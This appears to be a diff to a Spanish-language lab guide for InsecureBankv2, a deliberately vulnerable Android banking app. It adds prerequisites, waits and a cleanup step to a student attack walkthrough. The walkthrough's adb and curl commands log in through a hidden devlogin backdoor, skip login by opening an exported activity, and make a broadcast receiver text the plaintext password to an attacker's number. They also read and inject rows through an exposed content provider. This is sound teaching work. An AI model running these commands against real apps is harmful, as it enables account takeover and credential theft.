+# REQUISITOS: los tres de abajo, o los pasos 2 y 4 no producen nada.
+#   a) el backend levantado
+#   b) la app apuntando al host (si la reinstalaste, repita §2.5)
+#   c) un login correcto ya hecho (rellena mySharedPreferences, que es de donde
+#      el receptor de SMS saca la contraseña)
+systemctl is-active insecurebankv2-server   # debe decir: active
+adb -s 172.25.208.100:5555 shell "ls /data/data/com.android.insecurebankv2/shared_prefs/"
+# debe listar: com.android.insecurebankv2_preferences.xml  y  mySharedPreferences.xml
+```
+
+Si `mySharedPreferences.xml` no está, haz primero el login del §1.3. Y si el
+backend está parado, `curl` sale con `rc=7` y no hay backdoor que demostrar: el
+endpoint no existe porque no hay servidor.
+
+```bash
 D="-s 172.25.208.100:5555"
 U=content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
 
@@ -995,11 +1355,13 @@ curl -s -X POST -d 'username=devadmin&password=x' http://127.0.0.1:8888/devlogin
 adb $D shell am force-stop com.android.insecurebankv2
 adb $D shell input keyevent 3
 adb $D shell am start -n com.android.insecurebankv2/.PostLogin
+sleep 3
 
 # 4. M4 + M7 + M10 + M6 — la contraseña en claro, por SMS, al atacante
 adb $D logcat -c
 adb $D shell am broadcast -n com.android.insecurebankv2/.MyBroadCastReceiver \
   --es phonenumber "+34600000000" --es newpass "ATACANTE-DICE-ESTO"
+sleep 3
 adb $D logcat -d | grep 'For the changepassword'
 
 # 5. M2/M7 — lectura e inyección en la base de datos de la app
@@ -1008,12 +1370,18 @@ adb $D shell content insert --uri "$U" --bind name:s:injectado
 
 # 6. M6 — el sistema ha dejado constancia de todo
 adb $D logcat -d | grep -iE 'Successful Login|changepassword'
+
+# 7. limpieza: la fila inyectada del paso 5 no debe quedarse
+adb $D shell "content delete --uri \"$U\" --where \"name='injectado'\""
 ```
 
-> Nota el paso 6: **logcat es un agregador de pruebas Gratis.** Casi todos los
+> Nota el paso 6: **logcat es un agregador de pruebas gratis.** Casi todos los
 > hallazgos de esta clase dejan rastro en `logcat` porque la app escribe con
 > `Log.d` y `System.out.println`. Antes de atacar, lee los logs: te dicen qué
 > hace la app.
+>
+> Y nota el paso 7: sin él, `trackerusers` se queda con la fila `injectado` para
+> todos los alumnos siguientes, que acabarán creyendo que es parte de la app.
 
 ## Anexo B — Reparación
 
